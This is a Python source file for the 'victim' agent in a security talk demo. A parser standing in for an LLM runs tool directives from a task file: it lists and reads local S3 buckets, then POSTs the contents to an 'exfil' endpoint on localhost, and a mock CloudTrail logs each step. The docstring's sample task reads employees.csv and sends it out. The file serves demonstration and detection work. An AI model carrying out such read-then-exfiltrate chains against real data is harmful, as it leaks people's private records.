"""
agent/agent.py — the "victim" component of the Obedient Insider demo.

The agent reads a plain-text task file and executes the tool directives it
contains. It does not know (or care) whether a task is legitimate; that is
the whole point of the demo. In a real deployment this would be an LLM
wrapping the same toolkit — the LLM is replaced here by a deterministic
parser so the talk reproduces the same way every time.

Task file format:

    # free text (comments, ignored but echoed to the audience)
    [TOOL: list_buckets]
    [TOOL: list_objects bucket=corp-internal]
    [TOOL: read_object bucket=corp-internal key=employees.csv]
    [TOOL: http_request url=http://localhost:8888/dump data=$last]

`$last` resolves to the most recent read_object result so that tasks can
chain "read then POST" without pasting file contents into the task file.

Run:
    python agent/agent.py                              # uses agent/tasks/current_task.txt
    python agent/agent.py agent/tasks/malicious_task.txt

Colour code on stdout:
    green  = benign actions / startup / execute_code
    yellow = reconnaissance (list / read)
    red    = outbound HTTP / errors / unknown tools
"""
from __future__ import annotations

import io
import json
import os
import re
import sys
from contextlib import redirect_stdout
from pathlib import Path

# When this file is launched as a script, its directory is on sys.path but
# the project root is not, so `from mock_cloud...` would fail. Prepend the
# project root explicitly to make both `python agent/agent.py` and
# `python -m agent.agent` work.
_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

import boto3
import requests
from botocore.client import Config
from botocore.exceptions import ClientError, EndpointConnectionError
from dotenv import load_dotenv

from mock_cloud.cloudtrail_mock import CloudTrailMock

load_dotenv()

AGENT_NAME             = os.environ.get("AGENT_NAME", "coding-assistant-v1")
AWS_ENDPOINT_URL       = os.environ.get("AWS_ENDPOINT_URL", "http://localhost:9000")
AWS_ACCESS_KEY_ID      = os.environ.get("AWS_ACCESS_KEY_ID", "minioadmin")
AWS_SECRET_ACCESS_KEY  = os.environ.get("AWS_SECRET_ACCESS_KEY", "minioadmin")
EXFIL_ENDPOINT         = os.environ.get("EXFIL_ENDPOINT", "http://localhost:8888/dump")
AWS_REGION             = os.environ.get("AWS_REGION", "us-east-1")

DEFAULT_TASK_FILE = Path("agent/tasks/current_task.txt")

# ANSI colour codes. Always emitted; modern terminals render them, other
# tools generally strip them. For a demo the output is always on-screen.
RESET  = "\033[0m"
BOLD   = "\033[1m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
RED    = "\033[31m"
CYAN   = "\033[36m"
GREY   = "\033[90m"


def _c(colour: str, text: str) -> str:
    return f"{colour}{text}{RESET}"


# ============================================================== toolkit

class AgentToolkit:
    """
    Capabilities granted to the assistant: S3 access, outbound HTTP, local
    code exec. Every call is mirrored to CloudTrailMock so the observer
    (built in step 4) can replay the full trail the way a SIEM replays real
    CloudTrail.
    """

    def __init__(self, s3_client, cloudtrail: CloudTrailMock, agent_name: str):
        self.s3 = s3_client
        self.ct = cloudtrail
        self.actor = agent_name

    # ---- S3 ops -------------------------------------------------------

    def list_buckets(self) -> list[str]:
        resp = self.s3.list_buckets()
        names = [b["Name"] for b in resp.get("Buckets", [])]
        self.ct.log_event(
            actor=self.actor,
            action="ListBuckets",
            resource="arn:aws:s3:::*",
            metadata={"responseElements": {"bucketCount": len(names)}},
        )
        return names

    def list_objects(self, bucket: str) -> list[str]:
        resp = self.s3.list_objects_v2(Bucket=bucket)
        keys = [obj["Key"] for obj in resp.get("Contents", [])]
        self.ct.log_event(
            actor=self.actor,
            action="ListObjectsV2",
            resource=f"arn:aws:s3:::{bucket}",
            metadata={"responseElements": {"objectCount": len(keys)}},
        )
        return keys

    def read_object(self, bucket: str, key: str) -> str:
        obj = self.s3.get_object(Bucket=bucket, Key=key)
        body = obj["Body"].read()
        # CloudTrail records the fact of the call and its size, not its
        # contents. We mirror that here.
        self.ct.log_event(
            actor=self.actor,
            action="GetObject",
            resource=f"arn:aws:s3:::{bucket}/{key}",
            metadata={"responseElements": {"bytes": len(body)}},
        )
        try:
            return body.decode("utf-8")
        except UnicodeDecodeError:
            return body.hex()

    # ---- Outbound HTTP -------------------------------------------------

    def make_http_request(self, url: str, data) -> str | int:
        """
        POST JSON to an arbitrary URL. This is the exit door for any data
        the agent has read — in real deployments it is the single most
        abused capability. Real CloudTrail does not cover arbitrary outbound
        HTTP, so we emit a synthetic "HTTPRequest" event under an invented
        eventSource for the observer to key off.
        """
        payload = {"payload": data}
        try:
            resp = requests.post(url, json=payload, timeout=5)
            status: str | int = resp.status_code
        except requests.RequestException as e:
            status = f"error:{e.__class__.__name__}"

        self.ct.log_event(
            actor=self.actor,
            action="HTTPRequest",
            resource=url,
            metadata={
                "method": "POST",
                "bytes": len(json.dumps(payload)),
                "responseElements": {"status": status},
            },
        )
        return status

    # ---- Local code exec ----------------------------------------------

    def execute_code(self, code_snippet: str) -> str:
        """
        Execute Python in a scoped local dict. This is *not* a real sandbox
        — any capability Python has (filesystem, subprocess, network) is
        still reachable. That mirrors the actual risk of handing an agent
        exec(); a real deployment would need a separate process, namespace,
        and syscall filter.
        """
        buf = io.StringIO()
        local_scope: dict = {}
        global_scope = {"__builtins__": __builtins__}
        self.ct.log_event(
            actor=self.actor,
            action="ExecuteCode",
            resource="local://python-exec",
            metadata={"bytes": len(code_snippet)},
        )
        try:
            with redirect_stdout(buf):
                exec(code_snippet, global_scope, local_scope)  # noqa: S102
        except Exception as e:
            return f"ExecutionError: {e}"
        return buf.getvalue()


# ============================================================== runtime

class AgentRuntime:
    """
    Parses the task prompt line-by-line, dispatches tool directives to the
    toolkit, and maintains a `$last` register so tasks can chain.
    """

    TOOL_RE = re.compile(r"^\s*\[TOOL:\s*([A-Za-z_][A-Za-z0-9_]*)(.*)\]\s*$")
    KV_RE   = re.compile(r"(\w+)=(\S+)")

    # Colour bucket per tool — drives the on-screen "green / yellow / red"
    # classification the audience sees as the script runs.
    COLOUR_BY_ACTION = {
        "list_buckets": YELLOW,
        "list_objects": YELLOW,
        "read_object":  YELLOW,
        "http_request": RED,
        "execute_code": GREEN,
    }

    def __init__(self, toolkit: AgentToolkit):
        self.toolkit = toolkit
        self.last_read: str | None = None

    def process_task(self, prompt: str) -> None:
        print(_c(CYAN, "[AGENT] Processing task prompt"))
        for raw in prompt.splitlines():
            line = raw.rstrip()
            if not line:
                continue
            # Comment / narrative lines — echo in grey so the stage audience
            # sees the "cover story" alongside the actual tool calls.
            if line.lstrip().startswith("#"):
                print(_c(GREY, f"        {line}"))
                continue
            m = self.TOOL_RE.match(line)
            if not m:
                print(_c(GREY, f"        {line}"))
                continue
            tool_name = m.group(1)
            params = self._parse_params(m.group(2))
            self._dispatch(tool_name, params)

    def _parse_params(self, param_string: str) -> dict[str, str]:
        return {k: v for k, v in self.KV_RE.findall(param_string)}

    def _dispatch(self, tool_name: str, params: dict[str, str]) -> None:
        colour = self.COLOUR_BY_ACTION.get(tool_name, GREEN)
        pretty = " ".join(f"{k}={v}" for k, v in params.items())
        print(_c(colour, f"[AGENT] -> {tool_name} {pretty}".rstrip()))

        try:
            if tool_name == "list_buckets":
                out = self.toolkit.list_buckets()
                print(_c(colour, f"[TOOL ] buckets: {out}"))

            elif tool_name == "list_objects":
                out = self.toolkit.list_objects(params["bucket"])
                print(_c(colour, f"[TOOL ] objects: {out}"))

            elif tool_name == "read_object":
                out = self.toolkit.read_object(params["bucket"], params["key"])
                self.last_read = out
                preview = out if len(out) <= 160 else out[:160] + "..."
                print(_c(colour, f"[TOOL ] content ({len(out)} chars): {preview}"))

            elif tool_name == "http_request":
                data_token = params.get("data", "")
                data = self.last_read or "" if data_token == "$last" else data_token
                status = self.toolkit.make_http_request(params["url"], data)
                print(_c(colour, f"[TOOL ] POST {params['url']} -> {status}"))

            elif tool_name == "execute_code":
                out = self.toolkit.execute_code(params.get("code", ""))
                print(_c(colour, f"[TOOL ] stdout:\n{out}"))

            else:
                print(_c(RED, f"[AGENT] unknown tool: {tool_name}"))

        except ClientError as e:
            print(_c(RED, f"[ERROR] AWS call failed: {e}"))
        except KeyError as e:
            print(_c(RED, f"[ERROR] missing parameter: {e}"))
        except EndpointConnectionError as e:
            print(_c(RED, f"[ERROR] endpoint unreachable: {e}"))


# ============================================================== main

def _startup_banner() -> None:
    masked = (AWS_ACCESS_KEY_ID[:8] + "****") if AWS_ACCESS_KEY_ID else "(unset)****"
    print(_c(GREEN, f"[AGENT] Starting {AGENT_NAME}"))
    print(_c(GREEN, "[AGENT] Loading environment configuration..."))
    print(_c(GREEN, f"[AGENT] Cloud credentials detected: AWS_ACCESS_KEY_ID = {masked}"))


def _make_s3_client():
    return boto3.client(
        "s3",
        endpoint_url=AWS_ENDPOINT_URL,
        aws_access_key_id=AWS_ACCESS_KEY_ID,
        aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
        config=Config(signature_version="s3v4", s3={"addressing_style": "path"}),
        region_name=AWS_REGION,
    )


def main(argv: list[str]) -> int:
    _startup_banner()

    task_path = Path(argv[1]) if len(argv) > 1 else DEFAULT_TASK_FILE
    if not task_path.exists():
        print(_c(RED, f"[AGENT] Task file not found: {task_path}"))
        return 2
    prompt = task_path.read_text(encoding="utf-8")
    print(_c(GREEN, f"[AGENT] Loaded task: {task_path}"))

    cloudtrail = CloudTrailMock()
    s3 = _make_s3_client()
    toolkit = AgentToolkit(s3, cloudtrail, AGENT_NAME)
    runtime = AgentRuntime(toolkit)

    runtime.process_task(prompt)
    print(_c(GREEN, "[AGENT] Task complete."))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
